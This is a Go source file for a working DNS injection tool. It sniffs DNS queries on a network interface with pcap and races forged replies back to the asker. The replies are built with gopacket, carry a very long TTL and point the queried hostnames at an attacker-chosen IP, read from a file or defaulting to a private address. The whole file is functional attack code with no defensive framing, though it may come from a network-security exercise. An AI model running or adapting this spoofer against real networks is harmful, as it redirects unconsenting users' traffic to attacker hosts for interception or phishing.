package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var handle *pcap.Handle
var err error

func getIPHostnameFromFile(filname string) ([]string, []string) {
	var ip_addresses []string
	var hostnames []string
	file, err := os.Open(filname)
	if err != nil {
		log.Fatal(err)
	}
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		ip_host := strings.Split(scanner.Text(), " ")
		ip_addresses = append(ip_addresses, ip_host[0])
		hostnames = append(hostnames, ip_host[1])
	}
	file.Close()
	return ip_addresses, hostnames
}

func IPToBytes(ip_address string) []byte {
	var target_ip []byte
	for _, e := range strings.Split(ip_address, ".") {
		int_ver, _ := strconv.Atoi(e)
		target_ip = append(target_ip, byte(int_ver))
	}

	return target_ip
}
func Inject(eth *layers.Ethernet, ip4 *layers.IPv4, udp *layers.UDP, dns *layers.DNS, target_ip []byte) {
	var typeDNS [3]layers.DNSType
	typeDNS[0] = layers.DNSTypeA
	typeDNS[1] = layers.DNSTypeAAAA
	typeDNS[2] = layers.DNSTypeCNAME
	for i := 0; i < 9; i++ {
		eth_copy := *eth
		ip4_copy := *ip4
		udp_copy := *udp
		dns_copy := *dns

		eth_copy.DstMAC = eth.SrcMAC
		eth_copy.SrcMAC = eth.DstMAC

		ip4_copy.DstIP = ip4.SrcIP
		ip4_copy.SrcIP = ip4.DstIP

		udp_copy.DstPort = udp.SrcPort
		udp_copy.SrcPort = udp.DstPort

		udp_copy.SetNetworkLayerForChecksum(&ip4_copy)

		dns_copy.QR = true
		dns_copy.RA = true
		dns_copy.ResponseCode = 0
		dns_copy.ANCount = 1

		var newmsg layers.DNSResourceRecord
		newmsg.Name = dns.Questions[0].Name
		newmsg.Type = dns.Questions[0].Type
		newmsg.Class = dns.Questions[0].Class
		newmsg.TTL = 2140000
		newmsg.DataLength = 4
		newmsg.Data = target_ip
		newmsg.IP = net.IP(target_ip)

		dns_copy.Answers = make([]layers.DNSResourceRecord, 1)
		dns_copy.Answers[0] = newmsg

		buffer := gopacket.NewSerializeBuffer()
		options := gopacket.SerializeOptions{
			ComputeChecksums: true,
			FixLengths:       true,
		}
		if err := gopacket.SerializeLayers(buffer, options,
			&eth_copy,
			&ip4_copy,
			&udp_copy,
			&dns_copy,
		); err != nil {
			log.Fatal(err)
		}
		outgoingPacket := buffer.Bytes()

		if err := handle.WritePacketData(outgoingPacket); err != nil {
			log.Fatal(err)
		}
	}
}
func main() {

	devices, _ := pcap.FindAllDevs()

	// some defination
	iface := devices[0].Name
	var hostnames_file string = ""
	var expression string = ""

	arguments := os.Args
	var read_arguments_index []int
	for index, element := range arguments {
		if element == "-i" {
			iface = arguments[index+1]
			read_arguments_index = append(read_arguments_index, index+1)
		} else if element == "-f" {
			hostnames_file = arguments[index+1]
			read_arguments_index = append(read_arguments_index, index+1)
		} else if string([]rune(element)[0]) == "-" {
			fmt.Println("UNKNOWN PARAMETER")
			os.Exit(3)
		}
	}
	maxValue := 0
	for _, element := range read_arguments_index {
		if element > maxValue {
			maxValue = element
		}
	}
	if len(arguments)-1 > maxValue {
		for i := maxValue + 1; i < len(arguments); i++ {
			expression += arguments[i] + " "
		}
	}
	handle, err = pcap.OpenLive(
		iface, //device
		int32(65535),
		true,
		-1*time.Second,
	)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	if expression != "" {
		err = handle.SetBPFFilter(expression + " and port 53")
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println("Filter with the condition ", expression)
	} else {
		handle.SetBPFFilter("port 53")
	}
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	packets := packetSource.Packets()
	for packet := range packets {

		var eth layers.Ethernet
		var ip4 layers.IPv4
		var udp layers.UDP
		var dns layers.DNS

		parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &eth, &ip4, &udp, &dns)
		decodedLayers := []gopacket.LayerType{}
		parser.DecodeLayers(packet.Data(), &decodedLayers)

		//对于询问型DNS包
		if !dns.QR && (int(dns.Questions[0].Type) == 1 || int(dns.Questions[0].Type) == 28) && udp.DstPort == 53 {
			if hostnames_file != "" {
				ip_addresses, hostnames := getIPHostnameFromFile(hostnames_file)
				for i, host := range hostnames {
					if host == string(dns.Questions[0].Name) {
						fmt.Println("***********************************************")
						fmt.Println("DNS Query for ", string(dns.Questions[0].Name))
						fmt.Println("Target Injection IP: ", ip_addresses[i])

						target_ip := IPToBytes(ip_addresses[i])
						Inject(&eth, &ip4, &udp, &dns, target_ip)
						fmt.Println("***********************************************")
					}
				}
			} else {
				fmt.Println("***********************************************")
				fmt.Println("DNS Query for ", string(dns.Questions[0].Name))
				fmt.Println("Target Injection IP:  192.168.154.136")
				target_ip := IPToBytes("192.168.154.136")
				Inject(&eth, &ip4, &udp, &dns, target_ip)
				fmt.Println("***********************************************")
			}
		}

	}
}
